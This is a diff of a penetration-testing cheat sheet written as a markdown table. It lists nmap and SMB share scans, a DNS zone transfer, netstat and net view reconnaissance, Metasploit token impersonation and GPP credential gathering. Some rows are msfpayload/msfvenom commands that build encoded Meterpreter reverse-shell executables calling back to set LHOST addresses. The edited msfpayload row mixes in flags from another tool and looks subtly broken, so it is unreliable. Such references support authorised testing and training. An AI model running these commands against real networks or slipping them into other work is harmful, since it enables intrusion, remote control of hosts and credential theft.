@@ -3,7 +3,6 @@
 | **Command** | **Description** |
 | :--- | :--- |
 | nmap -T4 -A -Pn -oA scan -v 192.168.1.1-254 | Full scan |
-| `for i in 21 22 23 80 443 445; do cat scan.gnmap | grep " $i/open" | cut -d "" -f2 > $i.txt; done` | Parse results into txt files per port |
 | nmap -T4 -v -oA myshares --script smb-enum-shares --script-args smbuser=pwndizzle,smbpass=mypassword -p445 192.168.1.1-254 | Check for open shares |
 | dig axfr[example.com](http://example.com/)@[ns1.example.com](http://ns1.example.com/) | DNS zone transfer \(Linux\) |
 | tcp.port, tcp.srcport, ip.src, ip.dst, or, and | Wireshark syntax |
@@ -30,7 +29,7 @@
 | netstat –nabo | Lists ports / connections with corresponding process \(-b\), don’t perform looking \(-n\), all connections \(-a\) and owning process ID \(-o\) |
 | netstat –r | Displays the routing table |
 |  |  |
-| netstat -anob \| findstr “services, process or port” | The “b” flag makes the command take longer but will output the process name using each of the connections. |
+| netstat -anob  | The “b” flag makes the command take longer but will output the process name using each of the connections. |
 | netsh diag show all | {**XP only**} Shows information on network services and adapters |
 | net view | Queries NBNS/SMB \(SAMBA\) and tries to find all hosts in your current workgroup or domain. |
 | net view /domain | List all domains available to the host |
@@ -128,7 +127,7 @@
 | load incongnito -&gt; list\_tokens -&gt; impersonate\_token | Use tokens |
 | use post/windows/gather/credentials/gpp | GPP |
 | run post/windows/gather/local\_admin\_search\_enum | Test other machines |
-| msfpayload windows/meterpreter/reverse\_tcp LHOST=192.168.0.1 LPORT=4445 R \| msfencode -t exe -e x86/shikata\_ga\_nai -c 5 &gt; custom.exe | Standalone meterpreter |
+| msfpayload windows/meterpreter/reverse\_tcp LHOST=192.168.0.1 LPORT=4445 R -f exe -e x86/shikata\_ga\_nai -c 5 &gt; custom.exe | Standalone meterpreter |
 | use exploit/multi/script/web\_delivery | Powershell payload delivery |
 | post/windows/manage/powershell/exec\_powershell | Upload and run a PS script through a session |
 | msfvenom -p windows/meterpreter/reverse\_tcp LHOST=172.1.3.19 LPORT=4444 -a x86 -f exe -e x86/shikata\_ga\_nai -b '\x00' -i 3 &gt; meter.exe | Generate standalone payload |
